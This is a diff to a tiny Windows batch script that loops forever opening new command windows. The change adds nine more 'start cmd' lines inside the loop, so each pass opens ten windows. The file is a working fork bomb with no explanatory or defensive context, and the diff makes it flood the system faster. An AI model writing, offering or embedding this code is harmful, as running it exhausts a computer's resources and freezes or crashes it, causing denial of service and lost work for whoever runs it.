@@ -1,4 +1,13 @@
 @echo off
 :loop
 start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
 goto loop
